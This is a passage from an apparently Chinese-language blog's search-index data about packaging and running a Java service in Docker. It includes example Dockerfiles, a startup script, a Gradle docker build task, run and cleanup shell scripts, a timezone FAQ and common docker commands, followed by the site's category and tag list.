/home/servicename/#指定时区RUN /bin/cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &#x27;Asia/Shanghai&#x27; &gt;/etc/timezoneENTRYPOINT [&quot;/home/servicename/run.sh&quot;] Dockerfile 示例 2 12345678910111213141516171819202122//基于官方镜像二次封装，包含基础工具，打包之后目录分开#基础镜像FROM 10.10.208.193:5000/urcs/java:8#ARG是Docker1.9 版本才新加入的指令,如果不支持该命令则直接赋值ARG appName=urcs-service-groupVOLUME [&quot;/tmp&quot;]#ADD ./* /home/$appName/#docker打包时配置文件分离/和helium目录结构保持一致ADD config /home/$appName/config/ADD *.jar /home/$appName/lib/ADD ./*.xml /home/$appName/ADD ./*.sh /home/$appName/#指定时区RUN /bin/cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &#x27;Asia/Shanghai&#x27; &gt;/etc/timezoneENTRYPOINT [&quot;/home/$appName/run.sh&quot;] 2.4 run.sh启动脚本 1234567891011121314151617#!/bin/bashulimit -c unlimitedulimit -n 32768basePath=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)SERVICE_HOME=$basePathSERVICE_LIBS=&quot;$SERVICE_HOME/&quot;SERVICE_MAIN=&quot;mainClass&quot;declare -a JAVA_ARGSJAVA_ARGS[0]=&quot;-Xmx256m&quot;JAVA_ARGS[1]=&quot;-Xms256m&quot;exec $JAVA_HOME/bin/java -Duser.dir=$SERVICE_HOME $&#123;JAVA_ARGS[@]&#125; -classpath $SERVICE_HOME:$SERVICE_LIBS/* $SERVICE_MAIN 2.5 build.gradle启动脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849buildscript &#123; repositories &#123; mavenCentral() &#125; dependencies &#123; //添加依赖jar包 classpath &#x27;se.transmode.gradle:gradle-docker:1.2&#x27; &#125;&#125;apply plugin: &#x27;docker&#x27;//build构造jar文件jar &#123; manifest &#123; attributes &#x27;Manifest-Version&#x27;: 1.0 attributes &#x27;Main-Class&#x27;: &#x27;mainClass&#x27; &#125; enabled = true&#125;//打包可运行jar包task buildRunJar(type:Copy, dependsOn: build) &#123; from configurations.runtime from &#x27;src/main/resources&#x27; into &#x27;build/libs&#x27; // 目标位置&#125;//打包dockertask buildDocker(type: Docker, dependsOn: buildRunJar) &#123; push = true //TODO 前面为服务器期名 + 后面为服务名【以后修改最好不把服务器名打进去】 tag = &quot;10.10.208.193:5000/&quot; + &quot;servicename&quot; applicationName = jar.baseName dockerfile = file(&#x27;src/main/docker/Dockerfile&#x27;) doFirst &#123; copy &#123; from &#x27;build/libs&#x27; into stageDir &#125; &#125;&#125;dependencies &#123; ....&#125; 2.6. docker-clean-build.sh1234docker rm `docker ps -a -q`docker rmi --force `docker images | grep servicename | awk &#x27;&#123;print $3&#125;&#x27;`gradle cleangradle buildDocker -x test 2.7. docker-run.sh123456789101112131415161718192021docker stop servicenamedocker rm `docker ps -a -q`docker run \\ --env PRIVATE_IP=0.0.0.0 \\ --env REG_IP=10.10.208.194 \\ --env ZK_HOSTS=10.10.208.194:7998 \\ --env HTTP_PORT=8011 \\ --env HTTP_DASH_PORT=8111 \\ --env RPC_PORT=6011 \\ --env RPC_STACK=rpc-stack \\ --env HTTP_STACK=http-stack \\ --env HTTP_DASH_STACK=http-dash-stack \\ --env KAFKA_HOST=10.10.208.194 \\ --privileged=true \\ -p 8011:8011 \\ -p 8111:8111 \\ -p 6011:6011 \\ -d --name servicename1.0 \\ 10.10.208.193:5000/servicename1.0.0-1902151423 3 常见问题1.docker容器时间与宿主机时间不一至,容器时间为UTC时间 1.1.解决：Dockerfile增加 #指定时区 RUN /bin/cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &#39;Asia/Shanghai&#39; &gt;/etc/timezone 2.docker基础镜像中安装常用功能,例如vim 4 常用命令 docker run -p 8888:8888 $name tag docker stop $name docker rm $name docker inspect $name docker ps -a | -l docker logs [-f] [-t] [-tail] $name -f –follows=true | false，默认是false，显示更新 -t –timestamps=true | false，默认是false，显示时间戳 –tail=“all” | 行数，显示最新行数的日志","categories":[],"tags":[]}],"categories":[{"name":"net","slug":"net","permalink":"https://wuhaocn.github.io/categories/net/"},{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"},{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/categories/MySQL/"},{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/categories/TCP/"},{"name":"SIP","slug":"SIP","permalink":"https://wuhaocn.github.io/categories/SIP/"},{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"},{"name":"sentinel","slug":"sentinel","permalink":"https://wuhaocn.github.io/categories/sentinel/"},{"name":"MyBatis","slug":"MyBatis","permalink":"https://wuhaocn.github.io/categories/MyBatis/"},{"name":"mq","slug":"mq","permalink":"https://wuhaocn.github.io/categories/mq/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://wuhaocn.github.io/categories/zookeeper/"},{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"},{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/categories/ClickHouse/"},{"name":"rpc","slug":"rpc","permalink":"https://wuhaocn.github.io/categories/rpc/"},{"name":"netty","slug":"netty","permalink":"https://wuhaocn.github.io/categories/netty/"},{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"},{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"},{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"},{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"},{"name":"短信","slug":"短信","permalink":"https://wuhaocn.github.io/categories/%E7%9F%AD%E4%BF%A1/"},{"name":"编程语言 - shell","slug":"编程语言-shell","permalink":"https://wuhaocn.github.io/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80-shell/"}],"tags":[{"name":"net","slug":"net","permalink":"https://wuhaocn.github.io/tags/net/"},{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"},{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/tags/java/"},{"name":"grafana","slug":"grafana","permalink":"https://wuhaocn.github.io/tags/grafana/"},{"name":"prometheus","slug":"prometheus","permalink":"https://wuhaocn.github.io/tags/prometheus/"},{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/tags/MySQL/"},{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/tags/TCP/"},{"name":"IMS","slug":"IMS","permalink":"https://wuhaocn.github.io/tags/IMS/"},{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"},{"name":"sentinel","slug":"sentinel","permalink":"https://wuhaocn.github.io/tags/sentinel/"},{"name":"MyBatis","slug":"MyBatis","permalink":"https://wuhaocn.github.io/tags/MyBatis/"},{"name":"nexus","slug":"nexus","permalink":"https://wuhaocn.github.io/tags/nexus/"},{"name":"mq","slug":"mq","permalink":"https://wuhaocn.github.io/tags/mq/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://wuhaocn.github.io/tags/zookeeper/"},{"name":"pika","slug":"pika","permalink":"https://wuhaocn.github.io/tags/pika/"},{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/tags/ClickHouse/"},{"name":"netty","slug":"netty","permalink":"https://wuhaocn.github.io/tags/netty/"},{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"},{"name":"log4j","slug":"log4j","permalink":"https://wuhaocn.github.io/tags/log4j/"},{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"},{"name":"brew","slug":"brew","permalink":"https://wuhaocn.github.io/tags/brew/"},{"name":"atomic","slug":"atomic","permalink":"https://wuhaocn.github.io/tags/atomic/"},{"name":"design","slug":"design","permalink":"https://wuhaocn.github.io/tags/design/"},{"name":"动态调试技术","slug":"动态调试技术","permalink":"https://wuhaocn.github.io/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"},{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"},{"name":"ai","slug":"ai","permalink":"https://wuhaocn.github.io/tags/ai/"},{"name":"jenkins","slug":"jenkins","permalink":"https://wuhaocn.github.io/tags/jenkins/"},{"name":"cmpp","slug":"cmpp","permalink":"https://wuhaocn.github.io/tags/cmpp/"},{"name":"ftp","slug":"ftp","permalink":"https://wuhaocn.github.io/tags/ftp/"},{"name":"NGAP","slug":"NGAP","permalink":"https://wuhaocn.github.io/tags/NGAP/"},{"name":"DPDK","slug":"DPDK","permalink":"https://wuhaocn.github.io/tags/DPDK/"},{"name":"MEC","slug":"MEC","permalink":"https://wuhaocn.github.io/tags/MEC/"},{"name":"网络切片","slug":"网络切片","permalink":"https://wuhaocn.github.io/tags/%E7%BD%91%E7%BB%9C%E5%88%87%E7%89%87/"},{"name":"字节码","slug":"字节码","permalink":"https://wuhaocn.github.io/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"},{"name":"AOP","slug":"AOP","permalink":"https://wuhaocn.github.io/tags/AOP/"},{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]}